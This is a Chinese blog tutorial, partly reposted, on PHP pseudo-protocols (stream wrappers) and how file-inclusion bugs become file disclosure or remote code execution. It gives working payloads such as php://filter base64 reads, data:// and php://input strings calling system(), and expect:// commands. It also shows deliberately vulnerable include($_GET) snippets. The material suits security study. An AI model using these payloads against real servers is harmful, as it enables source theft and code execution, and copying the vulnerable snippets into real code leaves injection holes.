---
title: php伪协议
date: 2017-08-27 00:37:29
categories: web
tags: php
---

本文参考的是 Hello_C的php伪协议这篇文章，内容大部分时粘贴过来的。当然也参考了先知上的文章：[https://xianzhi.aliyun.com/forum/mobile/read/795.html](https://xianzhi.aliyun.com/forum/mobile/read/795.html)——如何优雅的把lfi转化为rce（2017-02-27更新版）。当然，先知上的文章有点问题，因为web用户可能没有那么高的权限去访问log文件或者打开allow_url_include设置。

### PHP协议/封装协议

| 包装或协议              | 控制能力                    | allow_url_include | 漏洞类型      | 备注                                       |
| ------------------ | ----------------------- | ----------------- | --------- | ---------------------------------------- |
| file://            | -                       | Off               | LFI /文件操作 |                                          |
| glob://            | -                       | Off               | 目录遍历      |                                          |
| php://filter/read  | include                 | Off               | 文件泄露      | PHP：//filter/read=convert.base64-encode/resource=index.php |
| php://filter/write | file_put_contents       | Off               | 编码        | file_put_contents(“php://filter/write=string.rot13/resource=x.txt”,”content”); |
| php://input        | include                 | On                | RCE       | Encoding is required while reading .php source: <?php echo base64_encode(file_get_contents(“solution.php”));?> OR just use <?php system(‘cat x.php’);?> |
| data://            | include                 | On                | RCE       | data:text/plain,<?php system(“id”)?> OR data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4= |
| zip://             | include + uploaded file | Off               | RCE       |                                          |
| phar://            | include + uploaded file | Off               | RCE       | PHP版本> = 5.3                             |

php中支持的伪协议

```
file:// — 访问本地文件系统
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
```

这里可以参考[官方文档](http://php.net/manual/zh/wrappers.php)进行查看。而遇见最多的也就是php://协议了：

- #### php://stdin

  主要用于php cli的输入

```
<?php  
while($line = fopen('php://stdin','r')){  
    echo fgets($line);  
}  
?>
```

[![img](http://i4.buimg.com/567571/f0b778051856c477.jpg)](/images/2017-07-28/f0b778051856c477.jpg)

- #### php://stdout

  主要用于php cli的输入`<?php  $fh = fopen('php://stdout', 'w');  fwrite($fh, "标准输出php://stdout\n");  fclose($fh);  fwrite(STDOUT, "标准输出STDOUT\n");  ?>`

[![img](http://i4.buimg.com/567571/e62036bab64c514b.jpg)](/images/2017-07-28/e62036bab64c514b.jpg)

- #### php://input

  可以读取到post没有解析的原始数据`<?php   echo file_get_contents($_GET["a"]);  ?>`

[![img](http://i4.buimg.com/567571/caba05f9460d9dbe.jpg)](/images/2017-07-28/caba05f9460d9dbe.jpg)
当php代码换成

```
<?php  
$code = $_GET['a'];  
include($code);  
?>
```

而且当php远程包含打开的时候（当allow_url_include=on),就可以造成任意代码执行。
[![img](http://i4.buimg.com/567571/52bcb6ca96711975.jpg)](/images/2017-07-28/52bcb6ca96711975.jpg)

- #### php://output

  是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区`<?php   $code=$_GET["a"];   file_put_contents($code,"test");   ?>`

[![img](http://i4.buimg.com/567571/ab8f21052b4e2890.jpg)](/images/2017-07-28/ab8f21052b4e2890.jpg)

- #### php://filter

  是一种元封装器， 设计用于数据流打开时的筛选过滤应用`<?php  $filename=$_GET["a"];  $data="test";  file_put_contents($filename, $data);  ?>`

?a=php://filter/write=string.tolower/resource=test.php
可以往服务器中写入一个文件内容全为小写且文件名为test.php的文件：
其中 ：
（1）string.tolower //写入内容全部变成小写
（2）string.toupper //写入内容全部变成大写
（3）string.rot13 //写入内容全部对字符串执行 ROT13 编码
通过：?a=php://filter/convert.base64-encode/resource=test.php
可以往服务器中写入一个文件内容为base64编码且文件名为test.php的文件
[![img](http://i2.muimg.com/567571/f80e4710de9ee31d.jpg)](/images/2017-07-28/f80e4710de9ee31d.jpg)

```
<?php  
$filename=$_GET["a"];  
echo file_get_contents($filename);  
?> 

<?php  
$filename=$_GET["a"]; 
include("$filename");  
?>
```

?a=php://filter/convert.base64-encode/resource=test.php,就可以把test.php的内容以base64编码的方式显示出来

双引号包含的变量$filename，可以当成正常变量执行，而单引号包裹的变量则会当成字符串

- 

那么可以用?hax=expect://command 来执行任意linux指令，但是：
Note:该封装协议默认未开启
为了使用 expect:// 封装器，你必须安装» PECL 上的 » Expect扩展。

- #### data://

  数据流封装器
  当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行`<?php  $filename=$_GET["a"];  include("$filename");  ?>`

[![img](http://i4.buimg.com/567571/19570d7acea8b8a7.jpg)](/images/2017-07-28/19570d7acea8b8a7.jpg)

参考链接：
[http://blog.csdn.net/niexinming/article/details/52605144](http://blog.csdn.net/niexinming/article/details/52605144)

- **本文作者：** Hello_C
- **本文链接：** [http://yoursite.com/代码/2017/04/09/PHP伪协议.html](http://yoursite.com/%E4%BB%A3%E7%A0%81/2017/04/09/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE.html)
- **版权声明： **本博客所有文章除特别声明外，均采用 [CC BY-NC-SA 3.0](https://creativecommons.org/licenses/by-nc-sa/3.0/) 许可协议。转载请注明出处！